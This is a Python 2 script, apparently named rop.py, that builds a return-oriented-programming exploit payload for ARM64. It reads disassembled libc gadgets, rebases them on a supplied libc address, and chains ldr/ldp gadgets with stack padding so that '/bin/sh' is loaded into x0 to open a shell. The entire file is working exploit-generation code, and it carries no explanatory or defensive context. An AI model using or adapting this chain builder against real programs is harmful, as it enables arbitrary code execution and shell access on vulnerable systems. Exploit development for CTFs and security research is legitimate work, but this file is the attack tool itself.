#!/usr/bin/python

import sys, getopt

def hex_rev(hexNum):
    gSwap = hex(hexNum).lstrip("0x").rstrip("L")
    # Reverse the bytes in string
    gSwap = swap_order(gSwap, len(gSwap), 2)
    gSwap = gSwap.ljust(16, '0')
    # print("gSwap: " + gSwap)     
    return gSwap

def swap_order(d, wsz=4, gsz=2):
    return "".join(["".join([m[i:i+gsz] for i in range(wsz-gsz,-gsz,-gsz)]) for m in [d[i:i+wsz] for i in range(0,len(d),wsz)]])

def main(argv):
    inputfile = ''
    outputfile = ''
    libc = '' 
    exploit = ''
    try:
        opts, args = getopt.getopt(argv,"hi:o:l:e:",["ifile=","ofile=","llibc=","eexploit="])
    except getopt.GetoptError:
        print 'rop.py -i <inputfile> -o <outputfile> -l <libc address> -e <exploit address>' 
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print 'rop.py -i <inputfile> -o <outputfile> -l <libc address> -e <exploit address>'
            sys.exit()
        elif opt in ("-i", "--ifile"):
            inputfile = arg
        elif opt in ("-o", "--ofile"):
            outputfile = arg
        elif opt in ("-l", "--llibc"):
            libc = int(arg, 16)
        elif opt in ("-e", "--eexploit"): 
            exploit = int(arg, 16)

    print 'Input file: "', inputfile
    print 'Output file: "', outputfile
    print 'libc addres: "', libc
    print 'exploit address: "', exploit

    print("Hexadecimal form of libc: " + str(libc) + " is " + hex(libc).lstrip("0x").rstrip("L"))
    print("Hexadecimal form of exploit: " + str(exploit) + " is " + hex(exploit).lstrip("0x").rstrip("L"))

    # initializing bad_chars_list 
    bad_chars = ['#', ':', ';', "]"] 

    # get Address of exploit
    eAddr = exploit
    print("exploit eAddr: " + hex(eAddr))

    # get Address of stack
    stack = exploit + 64
    print("stack address: " + hex(stack))

    import array as arr
    gadget = arr.array('L')
    gNum = 0

    fin = open(inputfile, 'r')

    # Loop over lines and extract variables of interest
    for line in fin:
        line = line.strip()
        columns = line.split()
        print(columns)
        num = 1
        # get Address of libc
        gAddr = libc
        for i in range(0, len(columns)):
            # print(columns[i])
            # using join() + generator to remove bad_chars  
            edit = ''.join(i for i in columns[i] if not i in bad_chars)
            # print("column: " + str(i) + ", string: " + edit)
            # first hex number and ldr instruction
            if edit.startswith('0x') and num == 1:
                print("num: " + str(num) + ", number: " + edit)
                num += 1
                gAddr += int(edit, 16)
                # print("gAddr: " + hex(gAddr))
                gadget.append(gAddr)
                print("gNum: " + str(gNum) + ", gadget: " + hex(gadget[gNum]))
                gNum += 1                
  
    fin.seek(0)
    fout = open(outputfile, 'w+')
    zPad = ''
    zEnd = ''

    x0_1 = "0x0000000000000000"
    x0_2 = "0x2F62696E2F736800"     # /bin/sh

    print("************ REWIND ****************")

    bLdr = False
    bX29 = False
    bX19 = False
    gMax = gNum - 1
    print("gMax: " + str(gMax))
    gNum = 0
    iOffset = 0
    iAddr = 0
    ldrCnt = 0
    ldpCnt = 0

    # Loop over lines and extract variables of interest
    for line in fin:
        line = line.strip()
        columns = line.split()
        print(columns)
        num = 1
        # get Address of libc
        gAddr = libc
        for i in range(3, len(columns)):
            # print(columns[i])
            # using join() + generator to remove bad_chars  
            edit = ''.join(i for i in columns[i] if not i in bad_chars)
            # print("column: " + str(i) + ", string: " + edit)
            # check if ldr or ldp instruction
            if (edit == 'ldr' and columns[i+1] == 'x0,'):
                bLdr = True
                bX29 = False
                bX19 = False
                print("ldr, value: " + str(bLdr))
            elif (edit == 'ldp' and columns[i+1] == 'x29,'):
                print("edit: " + edit + " - columns[" + str(i+1) + "]: " + columns[i+1] + " - columns[" + str(i+2) + "]: " + columns[i+2])
                bLdr = False
                bX29 = True
                bX19 = False
                print("bX29, value: " + str(bX29))                
            elif (edit == 'ldp' and columns[i+1] == 'x19,'):
                print("edit: " + edit + " - columns[" + str(i+1) + "]: " + columns[i+1] + " - columns[" + str(i+2) + "]: " + columns[i+2])
                bLdr = False
                bX29 = False
                bX19 = True
                print("bX19, value: " + str(bX19))

            # Hex number and ldr instruction and ldrCnt == 0
            if edit.startswith('0x') and bLdr and ldrCnt == 0:
                print("ldrCnt: " + str(ldrCnt))
                ldrCnt += 1

                iPad = stack - exploit
                print("iPad: " + hex(iPad))

                iAddr = exploit + iPad
                print("iAddr: " + hex(iAddr))

                zPad = ''
                zPad = zPad.zfill(iPad * 2)
                print("zPad: " + zPad)
                fout.write(zPad)

                stack += 16
                print("x29: " + hex(stack))
                gStack = hex_rev(stack)
                print("x29: " + gStack)
                fout.write(gStack)

                print("bLdr, gNum: " + str(gNum))
                print("x30: " + str(gNum) + ", gadget: " + hex(gadget[gNum]))
                gSwap = hex_rev(gadget[gNum])
                gNum += 1
                print("x30: " + gSwap)
                fout.write(gSwap)

                iAddr += 16
                print("iAddr: " + hex(iAddr))

                bLdr = False

            # Hex number and ldr instruction and ldrCnt == 1
            if edit.startswith('0x') and bLdr and ldrCnt == 1:
                print("ldrCnt: " + str(ldrCnt))
                ldrCnt += 1

                iAddr = exploit + iPad
                print("iAddr: " + hex(iAddr))

                bLdr = False

            # Hex number and lpd x29 instruction
            elif edit == '0x20' and bX29 and ldpCnt == 0:
                print("ldpCnt: " + str(ldpCnt))
                ldpCnt += 1

                print("ldp, x29, x30, number: " + edit)
                eOffset = int(edit, 16)
                print("eOffset: " + hex(eOffset))

                stack += eOffset
                print("x29: " + hex(stack))
                gStack = hex_rev(stack)
                print("x29: " + gStack)
                fout.write(gStack)

                print("x29, gNum: " + str(gNum))
                print("x30: " + str(gNum) + ", gadget: " + hex(gadget[gNum]))
                gSwap = hex_rev(gadget[gNum])
                gNum += 1
                print("x30: " + gSwap)
                fout.write(gSwap)

                iAddr += 16
                print("iAddr: " + hex(iAddr))

                print("ldr, x0, number: " + edit)
                eOffset = int(edit, 16)
                print("eOffset: " + hex(eOffset))

                zPad = ''
                zPad = zPad.zfill(8 * 2)
                print("zPad: " + zPad)
                fout.write(zPad)

                print("x0_1: " + x0_1)
                strip = x0_1[2:]
                print("strip: " + strip)
                fout.write(strip)

                iAddr += 16
                print("iAddr: " + hex(iAddr))

                bX29 = False

            # Hex number and lpd x29 instruction
            elif edit == '0x20' and bX29 and ldpCnt == 1:
                print("ldpCnt: " + str(ldpCnt))
                ldpCnt += 1

                print("ldp, x29, x30, number: " + edit)
                eOffset = int(edit, 16)
                print("eOffset: " + hex(eOffset))

                stack += eOffset
                print("x29: " + hex(stack))
                gStack = hex_rev(stack)
                print("x29: " + gStack)
                fout.write(gStack)

                gNum += 1
                print("x29, gNum: " + str(gNum))
                print("x30: " + str(gNum) + ", gadget: " + hex(gadget[gNum]))
                gSwap = hex_rev(gadget[gNum])
                print("x30: " + gSwap)
                fout.write(gSwap)

                print("x0_2: " + x0_2)
                strip = x0_2[2:]
                print("strip: " + strip)
                fout.write(strip)

                iPtr = stack - 16
                print("iPtr: " + hex(iPtr))
                gPtr = hex_rev(iPtr)
                print("gPtr: " + gPtr)
                fout.write(gPtr)

                bX29 = False

            # Hex number and lpd x29 instruction
            elif edit == '0x40' and bX29 :

                print("ldp, x29, x30, number: " + edit)
                zPad = ''
                zPad = zPad.zfill(32 * 2)
                print("zPad: " + zPad)
                fout.write(zPad)

                bX29 = False

            # Hex number and lpd x29 instruction
            elif edit == '0x30' and bX29 :

                print("ldp, x29, x30, number: " + edit)

                eOffset = int(edit, 16)
                print("eOffset: " + hex(eOffset))

                stack += eOffset
                print("x29: " + hex(stack))
                gStack = hex_rev(stack)
                print("x29: " + gStack)
                fout.write(gStack)
                
                gNum += 2       # Point to g0 (gNum -> 5)
                print("x29, gNum: " + str(gNum))
                print("x30: " + str(gNum) + ", gadget: " + hex(gadget[gNum]))
                gSwap = hex_rev(gadget[gNum])
                print("x30: " + gSwap)
                fout.write(gSwap)

                zPad = ''
                zPad = zPad.zfill(32 * 2)
                print("zPad: " + zPad)
                fout.write(zPad)

                bX29 = False

            # Hex number and lpd x19 instruction
            elif edit.startswith('0x') and bX19 :

                stack += 64     # Adjust Stack Offset, store in x29
                print("x29: " + hex(stack))
                gStack = hex_rev(stack)
                print("x29: " + gStack)
                fout.write(gStack)

                print("x29, gNum: " + str(gNum))
                print("x30: " + str(gNum) + ", gadget: " + hex(gadget[gNum]))
                gSwap = hex_rev(gadget[gNum])
                gNum += 1
                print("x30: " + gSwap)
                fout.write(gSwap)

                print("ldp x19, x20, [sp, number]: " + edit)
                eOffset = int(edit, 16)
                print("eOffset: " + hex(eOffset))

                print("x19, gNum: " + str(gNum))
                print("x19: " + str(gNum) + ", gadget: " + hex(gadget[4]))
                gSwap = hex_rev(gadget[4])
                print("x19: " + gSwap)
                fout.write(gSwap)

                print("x20: " + str(gNum) + ", gadget: " + hex(gadget[3]))
                gSwap = hex_rev(gadget[3])
                print("x20: " + gSwap)
                fout.write(gSwap)

                bX19 = False

    fin.close()
    fout.close()       

if __name__ == "__main__":
    main(sys.argv[1:])
